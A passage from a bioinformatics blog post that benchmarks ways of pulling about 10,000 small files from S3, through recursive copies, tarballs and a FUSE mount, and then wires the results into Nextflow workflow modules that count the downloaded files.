                 1K-blocks      Used     Available Use% Mounted on</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># udev                                  131907828         0     131907828   0% /dev</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># tmpfs                                  26401936      3052      26398884   1% /run</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># /dev/mapper/ubuntu--vg-ubuntu--lv     980760096 936881112       2913808 100% /</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># tmpfs                                 132009668         0     132009668   0% /dev/shm</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># tmpfs                                      5120         0          5120   0% /run/lock</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># tmpfs                                 132009668         0     132009668   0% /run/qemu</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># /dev/loop0                                65408     65408             0 100% /snap/core20/2682</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># /dev/loop1                                65408     65408             0 100% /snap/core20/2686</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># /dev/loop2                                75776     75776             0 100% /snap/core22/2216</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># /dev/loop3                                75776     75776             0 100% /snap/core22/2292</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># /dev/loop4                                93696     93696             0 100% /snap/lxd/35819</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># /dev/loop5                                93696     93696             0 100% /snap/lxd/36918</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># /dev/loop6                                52224     52224             0 100% /snap/snapd/25577</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># /dev/loop7                                49280     49280             0 100% /snap/snapd/25935</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># /dev/nvme0n1p2                          1992552    433904       1437408  24% /boot</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># /dev/nvme0n1p1                          1098632      6228       1092404   1% /boot/efi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># controller-01:/home                   476973568 349766144     106714624  77% /home</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># tmpfs                                  26401932         4      26401928   1% /run/user/1000</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># io-benchmark                      1099511627776         0 1099511627776   0% /scratch/data/nextflow-cost-optimization/mnt/vep_cache</span><br></span></code></pre></div></div>
<p>Now we can use this to simply download 10k files</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:hsl(221, 87%, 60%)">i</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">..</span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"> /usr/bin/time </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"%e"</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'cp -r ./mnt/vep_cache/tarball tarball '</span><span class="token plain"> </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tail</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-n</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-rf</span><span class="token plain"> ./tarball</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><br></span></code></pre></div></div>
<p>The stderr shows that it takes less than 45 seconds to download small files</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token number" style="color:hsl(35, 99%, 36%)">44.94</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token number" style="color:hsl(35, 99%, 36%)">46.06</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token number" style="color:hsl(35, 99%, 36%)">45.46</span><br></span></code></pre></div></div>
<p>Again, download only 10 GB tar file to see how it work</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:hsl(221, 87%, 60%)">i</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">..</span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"> /usr/bin/time </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"%e"</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'mkdir -p tarball &amp;&amp; cp ./mnt/vep_cache/tarball.tar tarball'</span><span class="token plain"> </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tail</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-n</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-rf</span><span class="token plain"> ./tarball</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><br></span></code></pre></div></div>
<p>The stderr shows that it takes less than 45 seconds to download small files</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token number" style="color:hsl(35, 99%, 36%)">15.60</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token number" style="color:hsl(35, 99%, 36%)">15.37</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token number" style="color:hsl(35, 99%, 36%)">15.74</span><br></span></code></pre></div></div>
<p>Again, download only 10 GB tar file to see how it work</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:hsl(221, 87%, 60%)">i</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">..</span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"> /usr/bin/time </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"%e"</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'mkdir -p tarball &amp;&amp; cat ./mnt/vep_cache/tarball.tar|tar -xvf - -C tarball'</span><span class="token plain"> </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tail</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-n</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-rf</span><span class="token plain"> ./tarball</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><br></span></code></pre></div></div>
<p>The stderr shows that it takes less than 45 seconds to download small files</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token number" style="color:hsl(35, 99%, 36%)">19.68</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token number" style="color:hsl(35, 99%, 36%)">21.86</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token number" style="color:hsl(35, 99%, 36%)">20.31</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="recap">Recap<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#recap" class="hash-link" aria-label="Direct link to Recap" title="Direct link to Recap" translate="no">​</a></h3>
<p>Here is a summary table of the different approaches for downloading 10k small files (1GB total) from S3, with their typical performance and recommended use cases:</p>
<table><thead><tr><th>Method</th><th>Download Time (s)</th><th>Pros</th><th>Cons</th><th>When to Use</th></tr></thead><tbody><tr><td><strong>AWS CLI (recursive, 10k files)</strong></td><td>~110</td><td>Simple, no extra setup</td><td>Very slow for many small files</td><td>Rarely; only for small numbers of files</td></tr><tr><td><strong>AWS CLI (tarball + untar via pipe)</strong></td><td>~33</td><td>Fast, single download + extraction</td><td>Needs tar/untar logic</td><td>When workflow can handle tar extraction</td></tr><tr><td><strong>FUSE (cp -r 10k files)</strong></td><td>~45</td><td>Transparent, works like local FS</td><td>Needs FUSE setup, not always fastest</td><td>When random access or partial reads are needed</td></tr><tr><td><strong>FUSE (cat tarball | tar -xvf -)</strong></td><td>~20</td><td>Fast, combines FUSE and streaming untar</td><td>Needs FUSE setup, tar logic</td><td>For large archives with extraction</td></tr></tbody></table>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p><strong>Recommendations:</strong></p><ul>
<li class="">For many small files, avoid direct recursive downloads; use tarballs or FUSE-based solutions.</li>
<li class="">Use tarball + untar (via pipe) for best performance if you can bundle files.</li>
<li class="">FUSE is ideal for workflows needing random access or partial reads, or when you can't change file structure.</li>
<li class="">Nextflow (v25.04+) improves small file handling, but bundling or FUSE still offers significant gains for large numbers of files.</li>
</ul></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="nextflow-integration">Nextflow integration<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#nextflow-integration" class="hash-link" aria-label="Direct link to Nextflow integration" title="Direct link to Nextflow integration" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="workflow">Workflow<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#workflow" class="hash-link" aria-label="Direct link to Workflow" title="Direct link to Workflow" translate="no">​</a></h3>
<p>We will simply run the workflow below that will accept the inputs from S3, download to use in this process and count the number of files inside</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">include </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> COUNT_FILES </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain">  from </span><span class="token string" style="color:hsl(119, 34%, 47%)">'./modules/count_files_tar.nf'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">include </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> COUNT_FILES_TAR </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"> from </span><span class="token string" style="color:hsl(119, 34%, 47%)">'./modules/count_files_tar.nf'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">workflow </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    main:        </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        // benchmark files input</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        // normal files</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">params.benchmark_input</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            ch_files </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> COUNT_FILES</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">Channel.fromPath</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">params.inputs</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">.collect</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        // tarball and untar</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">params.benchmark_input_tar</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            ch_files </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> COUNT_FILES_TAR</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">Channel.fromPath</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">params.inputs</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">.collect</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="modules">Modules<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#modules" class="hash-link" aria-label="Direct link to Modules" title="Direct link to Modules" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="count_files">COUNT_FILES<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#count_files" class="hash-link" aria-label="Direct link to COUNT_FILES" title="Direct link to COUNT_FILES" translate="no">​</a></h4>
<p>It will accept a list of files directly from s3</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process COUNT_FILES </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    cpus </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">file_path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-lah</span><span class="token plain"> tarball/**.data</span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token function" style="color:hsl(221, 87%, 60%)">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-l</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> num_files.txt</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="count_files_tar">COUNT_FILES_TAR<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#count_files_tar" class="hash-link" aria-label="Direct link to COUNT_FILES_TAR" title="Direct link to COUNT_FILES_TAR" translate="no">​</a></h4>
<p>It will download the tar file first, then inside the process untar later</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>For downloading file and use pipe to quickly untar will be applied later</p></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process COUNT_FILES_ </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    cpus </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">file_path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">tar</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-xf</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${file_path}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-lah</span><span class="token plain"> tarball/**.data</span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token function" style="color:hsl(221, 87%, 60%)">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-l</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> num_files.txt</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="remaining-materials">Remaining materials<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part2#remaining-materials" class="hash-link" aria-label="Direct link to Remaining materials" title="Direct link to Remaining materials" translate="no">​</a></h3>
<p>It will includes the configuration with nextflow configs, include:</p>
<ul>
<li class="">nextflow.config: Standard config to run with docker, singularity and different platform</li>
<li class="">nextflow_s3.config: S3 credential for minio storage</li>
